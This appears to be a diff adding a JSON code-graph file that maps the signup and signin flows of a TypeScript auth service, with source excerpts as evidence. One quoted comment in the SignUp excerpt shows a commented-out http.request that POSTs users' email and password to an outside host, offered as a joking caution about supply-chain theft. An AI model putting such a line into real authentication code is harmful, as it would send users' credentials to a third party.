+              "width": 240,
+              "height": 96
+            },
+            {
+              "id": "z2-signup-sanitize",
+              "semanticId": "signup-sanitize",
+              "x": 2360,
+              "y": 160,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signup-success",
+              "semanticId": "signup-success",
+              "x": 2650,
+              "y": 160,
+              "width": 210,
+              "height": 80
+            },
+            {
+              "id": "z2-signup-error",
+              "semanticId": "signup-error-forward",
+              "x": 2070,
+              "y": 300,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signin-validation",
+              "semanticId": "signin-route-validation",
+              "x": 40,
+              "y": 850,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signin-call",
+              "semanticId": "signin-route-call",
+              "x": 330,
+              "y": 850,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signin-find",
+              "semanticId": "signin-find",
+              "x": 620,
+              "y": 850,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signin-user-guard",
+              "semanticId": "signin-user-guard",
+              "x": 910,
+              "y": 850,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signin-missing",
+              "semanticId": "signin-missing",
+              "x": 1200,
+              "y": 730,
+              "width": 210,
+              "height": 80
+            },
+            {
+              "id": "z2-signin-verify",
+              "semanticId": "signin-verify",
+              "x": 1200,
+              "y": 890,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signin-password-guard",
+              "semanticId": "signin-password-guard",
+              "x": 1490,
+              "y": 890,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signin-invalid",
+              "semanticId": "signin-invalid",
+              "x": 1780,
+              "y": 770,
+              "width": 210,
+              "height": 80
+            },
+            {
+              "id": "z2-signin-token",
+              "semanticId": "signin-token",
+              "x": 1780,
+              "y": 930,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signin-sanitize",
+              "semanticId": "signin-sanitize",
+              "x": 2070,
+              "y": 930,
+              "width": 220,
+              "height": 88
+            },
+            {
+              "id": "z2-signin-success",
+              "semanticId": "signin-success",
+              "x": 2360,
+              "y": 930,
+              "width": 210,
+              "height": 80
+            },
+            {
+              "id": "z2-signin-error",
+              "semanticId": "signin-error-forward",
+              "x": 2070,
+              "y": 1110,
+              "width": 220,
+              "height": 88
+            }
+          ],
+          "edges": [
+            {
+              "id": "z2-signup-validated",
+              "source": "z2-signup-validation",
+              "target": "z2-signup-call",
+              "kind": "data",
+              "label": "validated IUserInputDTO",
+              "evidenceIds": [
+                "source-line:src/api/routes/auth.ts:16",
+                "source-line:src/api/routes/auth.ts:28",
+                "codegraph-relation:134"
+              ]
+            },
+            {
+              "id": "z2-signup-call-hash",
+              "source": "z2-signup-call",
+              "target": "z2-signup-hash",
+              "kind": "data",
+              "label": "userInputDTO.password",
+              "evidenceIds": [
+                "source-line:src/api/routes/auth.ts:28",
+                "source-line:src/services/auth.ts:42",
+                "codegraph-relation:134"
+              ]
+            },
+            {
+              "id": "z2-signup-hash-create",
+              "source": "z2-signup-hash",
+              "target": "z2-signup-create",
+              "kind": "data",
+              "label": "salt + hashedPassword",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:42",
+                "source-line:src/services/auth.ts:44",
+                "source-line:src/services/auth.ts:47"
+              ]
+            },
+            {
+              "id": "z2-signup-create-token",
+              "source": "z2-signup-create",
+              "target": "z2-signup-token",
+              "kind": "data",
+              "label": "userRecord",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:44",
+                "source-line:src/services/auth.ts:50",
+                "codegraph-relation:191"
+              ]
+            },
+            {
+              "id": "z2-signup-token-guard",
+              "source": "z2-signup-token",
+              "target": "z2-signup-guard",
+              "kind": "control",
+              "label": "源码下一步",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:50",
+                "source-line:src/services/auth.ts:52"
+              ]
+            },
+            {
+              "id": "z2-signup-fail",
+              "source": "z2-signup-guard",
+              "target": "z2-signup-failure",
+              "kind": "control",
+              "label": "记录为空",
+              "condition": "!userRecord",
+              "result": "throw User cannot be created",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:52",
+                "source-line:src/services/auth.ts:53"
+              ]
+            },
+            {
+              "id": "z2-signup-continue",
+              "source": "z2-signup-guard",
+              "target": "z2-signup-welcome",
+              "kind": "control",
+              "label": "记录存在",
+              "condition": "userRecord",
+              "result": "SendWelcomeEmail",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:52",
+                "source-line:src/services/auth.ts:56",
+                "codegraph-relation:192"
+              ]
+            },
+            {
+              "id": "z2-signup-to-dispatch",
+              "source": "z2-signup-welcome",
+              "target": "z2-signup-dispatch",
+              "kind": "data",
+              "label": "userRecord",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:56",
+                "source-line:src/services/auth.ts:58"
+              ]
+            },
+            {
+              "id": "z2-signup-event-edge",
+              "source": "z2-signup-dispatch",
+              "target": "z2-signup-handler",
+              "kind": "event",
+              "label": "onUserSignUp { user: userRecord }",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:58",
+                "source-line:src/subscribers/events.ts:3",
+                "source-line:src/subscribers/user.ts:36",
+                "source-line:src/subscribers/user.ts:37"
+              ]
+            },
+            {
+              "id": "z2-signup-to-sanitize",
+              "source": "z2-signup-dispatch",
+              "target": "z2-signup-sanitize",
+              "kind": "control",
+              "label": "dispatch 调用返回后继续",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:58",
+                "source-line:src/services/auth.ts:66"
+              ]
+            },
+            {
+              "id": "z2-signup-result",
+              "source": "z2-signup-sanitize",
+              "target": "z2-signup-success",
+              "kind": "data",
+              "label": "{ user without password/salt, token }",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:66",
+                "source-line:src/services/auth.ts:67",
+                "source-line:src/services/auth.ts:68",
+                "source-line:src/services/auth.ts:69",
+                "source-line:src/api/routes/auth.ts:29"
+              ]
+            },
+            {
+              "id": "z2-signup-error-edge",
+              "source": "z2-signup-failure",
+              "target": "z2-signup-error",
+              "kind": "control",
+              "label": "错误被重新抛出",
+              "condition": "SignUp throws",
+              "result": "route calls next(e)",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:72",
+                "source-line:src/api/routes/auth.ts:30",
+                "source-line:src/api/routes/auth.ts:32"
+              ]
+            },
+            {
+              "id": "z2-signin-validated",
+              "source": "z2-signin-validation",
+              "target": "z2-signin-call",
+              "kind": "data",
+              "label": "email + password",
+              "evidenceIds": [
+                "source-line:src/api/routes/auth.ts:39",
+                "source-line:src/api/routes/auth.ts:51",
+                "codegraph-relation:135"
+              ]
+            },
+            {
+              "id": "z2-signin-call-find",
+              "source": "z2-signin-call",
+              "target": "z2-signin-find",
+              "kind": "data",
+              "label": "email",
+              "evidenceIds": [
+                "source-line:src/api/routes/auth.ts:51",
+                "source-line:src/services/auth.ts:77",
+                "codegraph-relation:135"
+              ]
+            },
+            {
+              "id": "z2-signin-find-guard",
+              "source": "z2-signin-find",
+              "target": "z2-signin-user-guard",
+              "kind": "data",
+              "label": "userRecord or no record",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:77",
+                "source-line:src/services/auth.ts:78"
+              ]
+            },
+            {
+              "id": "z2-signin-missing-edge",
+              "source": "z2-signin-user-guard",
+              "target": "z2-signin-missing",
+              "kind": "control",
+              "label": "没有记录",
+              "condition": "!userRecord",
+              "result": "throw User not registered",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:78",
+                "source-line:src/services/auth.ts:79"
+              ]
+            },
+            {
+              "id": "z2-signin-found",
+              "source": "z2-signin-user-guard",
+              "target": "z2-signin-verify",
+              "kind": "control",
+              "label": "记录存在",
+              "condition": "userRecord",
+              "result": "argon2.verify",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:78",
+                "source-line:src/services/auth.ts:85"
+              ]
+            },
+            {
+              "id": "z2-signin-verify-guard",
+              "source": "z2-signin-verify",
+              "target": "z2-signin-password-guard",
+              "kind": "data",
+              "label": "validPassword",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:85",
+                "source-line:src/services/auth.ts:86"
+              ]
+            },
+            {
+              "id": "z2-signin-invalid-edge",
+              "source": "z2-signin-password-guard",
+              "target": "z2-signin-invalid",
+              "kind": "control",
+              "label": "密码无效",
+              "condition": "!validPassword",
+              "result": "throw Invalid Password",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:98",
+                "source-line:src/services/auth.ts:99"
+              ]
+            },
+            {
+              "id": "z2-signin-valid",
+              "source": "z2-signin-password-guard",
+              "target": "z2-signin-token",
+              "kind": "control",
+              "label": "密码有效",
+              "condition": "validPassword",
+              "result": "generateToken(userRecord)",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:86",
+                "source-line:src/services/auth.ts:89",
+                "codegraph-relation:195"
+              ]
+            },
+            {
+              "id": "z2-signin-token-sanitize",
+              "source": "z2-signin-token",
+              "target": "z2-signin-sanitize",
+              "kind": "data",
+              "label": "userRecord + token",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:89",
+                "source-line:src/services/auth.ts:91"
+              ]
+            },
+            {
+              "id": "z2-signin-result",
+              "source": "z2-signin-sanitize",
+              "target": "z2-signin-success",
+              "kind": "data",
+              "label": "{ user without password/salt, token }",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:91",
+                "source-line:src/services/auth.ts:92",
+                "source-line:src/services/auth.ts:93",
+                "source-line:src/services/auth.ts:97",
+                "source-line:src/api/routes/auth.ts:52"
+              ]
+            },
+            {
+              "id": "z2-signin-missing-forward",
+              "source": "z2-signin-missing",
+              "target": "z2-signin-error",
+              "kind": "control",
+              "label": "错误返回路由",
+              "condition": "SignIn throws",
+              "result": "next(e)",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:79",
+                "source-line:src/api/routes/auth.ts:53",
+                "source-line:src/api/routes/auth.ts:55"
+              ]
+            },
+            {
+              "id": "z2-signin-invalid-forward",
+              "source": "z2-signin-invalid",
+              "target": "z2-signin-error",
+              "kind": "control",
+              "label": "错误返回路由",
+              "condition": "SignIn throws",
+              "result": "next(e)",
+              "evidenceIds": [
+                "source-line:src/services/auth.ts:99",
+                "source-line:src/api/routes/auth.ts:53",
+                "source-line:src/api/routes/auth.ts:55"
+              ]
+            }
+          ]
+        }
+      }
+    }
+  },
+  "evidence": [
+    {
+      "id": "source-line:src/api/routes/auth.ts:12",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 12,
+      "endLine": 12,
+      "excerpt": "  app.use('/auth', route);"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:14",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 14,
+      "endLine": 14,
+      "excerpt": "  route.post("
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:15",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 15,
+      "endLine": 15,
+      "excerpt": "    '/signup',"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:16",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 16,
+      "endLine": 16,
+      "excerpt": "    celebrate({"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:17",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 17,
+      "endLine": 17,
+      "excerpt": "      body: Joi.object({"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:18",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 18,
+      "endLine": 18,
+      "excerpt": "        name: Joi.string().required(),"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:19",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 19,
+      "endLine": 19,
+      "excerpt": "        email: Joi.string().required(),"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:20",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 20,
+      "endLine": 20,
+      "excerpt": "        password: Joi.string().required(),"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:21",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 21,
+      "endLine": 21,
+      "excerpt": "      }),"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:27",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 27,
+      "endLine": 27,
+      "excerpt": "        const authServiceInstance = Container.get(AuthService);"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:28",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 28,
+      "endLine": 28,
+      "excerpt": "        const { user, token } = await authServiceInstance.SignUp(req.body as IUserInputDTO);"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:29",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 29,
+      "endLine": 29,
+      "excerpt": "        return res.status(201).json({ user, token });"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:30",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 30,
+      "endLine": 30,
+      "excerpt": "      } catch (e) {"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:32",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 32,
+      "endLine": 32,
+      "excerpt": "        return next(e);"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:37",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 37,
+      "endLine": 37,
+      "excerpt": "  route.post("
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:38",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 38,
+      "endLine": 38,
+      "excerpt": "    '/signin',"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:39",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 39,
+      "endLine": 39,
+      "excerpt": "    celebrate({"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:40",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 40,
+      "endLine": 40,
+      "excerpt": "      body: Joi.object({"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:41",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 41,
+      "endLine": 41,
+      "excerpt": "        email: Joi.string().required(),"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:42",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 42,
+      "endLine": 42,
+      "excerpt": "        password: Joi.string().required(),"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:43",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 43,
+      "endLine": 43,
+      "excerpt": "      }),"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:49",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 49,
+      "endLine": 49,
+      "excerpt": "        const { email, password } = req.body;"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:50",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 50,
+      "endLine": 50,
+      "excerpt": "        const authServiceInstance = Container.get(AuthService);"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:51",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 51,
+      "endLine": 51,
+      "excerpt": "        const { user, token } = await authServiceInstance.SignIn(email, password);"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:52",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 52,
+      "endLine": 52,
+      "excerpt": "        return res.json({ user, token }).status(200);"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:53",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 53,
+      "endLine": 53,
+      "excerpt": "      } catch (e) {"
+    },
+    {
+      "id": "source-line:src/api/routes/auth.ts:55",
+      "kind": "source",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 55,
+      "endLine": 55,
+      "excerpt": "        return next(e);"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:23",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 23,
+      "endLine": 23,
+      "excerpt": "      const salt = randomBytes(32);"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:42",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 42,
+      "endLine": 42,
+      "excerpt": "      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:44",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 44,
+      "endLine": 44,
+      "excerpt": "      const userRecord = await this.userModel.create({"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:45",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 45,
+      "endLine": 45,
+      "excerpt": "        ...userInputDTO,"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:46",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 46,
+      "endLine": 46,
+      "excerpt": "        salt: salt.toString('hex'),"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:47",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 47,
+      "endLine": 47,
+      "excerpt": "        password: hashedPassword,"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:48",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 48,
+      "endLine": 48,
+      "excerpt": "      });"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:50",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 50,
+      "endLine": 50,
+      "excerpt": "      const token = this.generateToken(userRecord);"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:52",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 52,
+      "endLine": 52,
+      "excerpt": "      if (!userRecord) {"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:53",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 53,
+      "endLine": 53,
+      "excerpt": "        throw new Error('User cannot be created');"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:56",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 56,
+      "endLine": 56,
+      "excerpt": "      await this.mailer.SendWelcomeEmail(userRecord);"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:58",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 58,
+      "endLine": 58,
+      "excerpt": "      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:66",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 66,
+      "endLine": 66,
+      "excerpt": "      const user = userRecord.toObject();"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:67",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 67,
+      "endLine": 67,
+      "excerpt": "      Reflect.deleteProperty(user, 'password');"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:68",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 68,
+      "endLine": 68,
+      "excerpt": "      Reflect.deleteProperty(user, 'salt');"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:69",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 69,
+      "endLine": 69,
+      "excerpt": "      return { user, token };"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:70",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 70,
+      "endLine": 70,
+      "excerpt": "    } catch (e) {"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:72",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 72,
+      "endLine": 72,
+      "excerpt": "      throw e;"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:77",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 77,
+      "endLine": 77,
+      "excerpt": "    const userRecord = await this.userModel.findOne({ email });"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:78",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 78,
+      "endLine": 78,
+      "excerpt": "    if (!userRecord) {"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:79",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 79,
+      "endLine": 79,
+      "excerpt": "      throw new Error('User not registered');"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:85",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 85,
+      "endLine": 85,
+      "excerpt": "    const validPassword = await argon2.verify(userRecord.password, password);"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:86",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 86,
+      "endLine": 86,
+      "excerpt": "    if (validPassword) {"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:89",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 89,
+      "endLine": 89,
+      "excerpt": "      const token = this.generateToken(userRecord);"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:91",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 91,
+      "endLine": 91,
+      "excerpt": "      const user = userRecord.toObject();"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:92",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 92,
+      "endLine": 92,
+      "excerpt": "      Reflect.deleteProperty(user, 'password');"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:93",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 93,
+      "endLine": 93,
+      "excerpt": "      Reflect.deleteProperty(user, 'salt');"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:97",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 97,
+      "endLine": 97,
+      "excerpt": "      return { user, token };"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:98",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 98,
+      "endLine": 98,
+      "excerpt": "    } else {"
+    },
+    {
+      "id": "source-line:src/services/auth.ts:99",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 99,
+      "endLine": 99,
+      "excerpt": "      throw new Error('Invalid Password');"
+    },
+    {
+      "id": "source-line:src/subscribers/events.ts:3",
+      "kind": "source",
+      "path": "src/subscribers/events.ts",
+      "startLine": 3,
+      "endLine": 3,
+      "excerpt": "    signUp: 'onUserSignUp',"
+    },
+    {
+      "id": "source-line:src/subscribers/user.ts:36",
+      "kind": "source",
+      "path": "src/subscribers/user.ts",
+      "startLine": 36,
+      "endLine": 36,
+      "excerpt": "  @On(events.user.signUp)"
+    },
+    {
+      "id": "source-line:src/subscribers/user.ts:37",
+      "kind": "source",
+      "path": "src/subscribers/user.ts",
+      "startLine": 37,
+      "endLine": 37,
+      "excerpt": "  public onUserSignUp({ name, email, _id }: Partial<IUser>) {"
+    },
+    {
+      "id": "source-line:src/subscribers/user.ts:42",
+      "kind": "source",
+      "path": "src/subscribers/user.ts",
+      "startLine": 42,
+      "endLine": 42,
+      "excerpt": "       * @TODO implement this"
+    },
+    {
+      "id": "source-line:src/subscribers/user.ts:46",
+      "kind": "source",
+      "path": "src/subscribers/user.ts",
+      "startLine": 46,
+      "endLine": 46,
+      "excerpt": "      // TrackerService.track('user.signup', { email, _id })"
+    },
+    {
+      "id": "source-line:src/subscribers/user.ts:48",
+      "kind": "source",
+      "path": "src/subscribers/user.ts",
+      "startLine": 48,
+      "endLine": 48,
+      "excerpt": "      // MailService.startSequence('user.welcome', { email, name })"
+    },
+    {
+      "id": "source:src/services/auth.ts:21-74",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 21,
+      "endLine": 74,
+      "excerpt": "  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {\n    try {\n      const salt = randomBytes(32);\n\n      /**\n       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.\n       * require('http')\n       *  .request({\n       *     hostname: 'http://my-other-api.com/',\n       *     path: '/store-credentials',\n       *     port: 80,\n       *     method: 'POST',\n       * }, ()=>{}).write(JSON.stringify({ email, password })).end();\n       *\n       * Just kidding, don't do that!!!\n       *\n       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that\n       * watches every API call and if it spots a 'password' and 'email' property then\n       * it decides to steal them!? Would you even notice that? I wouldn't :/\n       */\n      this.logger.silly('Hashing password');\n      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });\n      this.logger.silly('Creating user db record');\n      const userRecord = await this.userModel.create({\n        ...userInputDTO,\n        salt: salt.toString('hex'),\n        password: hashedPassword,\n      });\n      this.logger.silly('Generating JWT');\n      const token = this.generateToken(userRecord);\n\n      if (!userRecord) {\n        throw new Error('User cannot be created');\n      }\n      this.logger.silly('Sending welcome email');\n      await this.mailer.SendWelcomeEmail(userRecord);\n\n      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });\n\n      /**\n       * @TODO This is not the best way to deal with this\n       * There should exist a 'Mapper' layer\n       * that transforms data from layer to layer\n       * but that's too over-engineering for now\n       */\n      const user = userRecord.toObject();\n      Reflect.deleteProperty(user, 'password');\n      Reflect.deleteProperty(user, 'salt');\n      return { user, token };\n    } catch (e) {\n      this.logger.error(e);\n      throw e;\n    }\n  }",
+      "providerId": "method:efff171c040f3832cb835c36c35e48a2"
+    },
+    {
+      "id": "source:src/services/auth.ts:76-101",
+      "kind": "source",
+      "path": "src/services/auth.ts",
+      "startLine": 76,
+      "endLine": 101,
+      "excerpt": "  public async SignIn(email: string, password: string): Promise<{ user: IUser; token: string }> {\n    const userRecord = await this.userModel.findOne({ email });\n    if (!userRecord) {\n      throw new Error('User not registered');\n    }\n    /**\n     * We use verify from argon2 to prevent 'timing based' attacks\n     */\n    this.logger.silly('Checking password');\n    const validPassword = await argon2.verify(userRecord.password, password);\n    if (validPassword) {\n      this.logger.silly('Password is valid!');\n      this.logger.silly('Generating JWT');\n      const token = this.generateToken(userRecord);\n\n      const user = userRecord.toObject();\n      Reflect.deleteProperty(user, 'password');\n      Reflect.deleteProperty(user, 'salt');\n      /**\n       * Easy as pie, you don't need passport.js anymore :)\n       */\n      return { user, token };\n    } else {\n      throw new Error('Invalid Password');\n    }\n  }",
+      "providerId": "method:f948523f23b6fd3735dceca8bb27f31c"
+    },
+    {
+      "id": "codegraph-relation:134",
+      "kind": "codegraph-relation",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 28,
+      "endLine": 28,
+      "excerpt": "        const { user, token } = await authServiceInstance.SignUp(req.body as IUserInputDTO);",
+      "providerId": "134"
+    },
+    {
+      "id": "codegraph-relation:191",
+      "kind": "codegraph-relation",
+      "path": "src/services/auth.ts",
+      "startLine": 50,
+      "endLine": 50,
+      "excerpt": "      const token = this.generateToken(userRecord);",
+      "providerId": "191"
+    },
+    {
+      "id": "codegraph-relation:135",
+      "kind": "codegraph-relation",
+      "path": "src/api/routes/auth.ts",
+      "startLine": 51,
+      "endLine": 51,
+      "excerpt": "        const { user, token } = await authServiceInstance.SignIn(email, password);",
+      "providerId": "135"
+    },
+    {
+      "id": "codegraph-relation:192",
+      "kind": "codegraph-relation",
+      "path": "src/services/auth.ts",
+      "startLine": 56,
+      "endLine": 56,
+      "excerpt": "      await this.mailer.SendWelcomeEmail(userRecord);",
+      "providerId": "192"
+    },
+    {
+      "id": "codegraph-relation:195",
+      "kind": "codegraph-relation",
+      "path": "src/services/auth.ts",
+      "startLine": 89,
+      "endLine": 89,
+      "excerpt": "      const token = this.generateToken(userRecord);",
+      "providerId": "195"
+    }
+  ]
+}
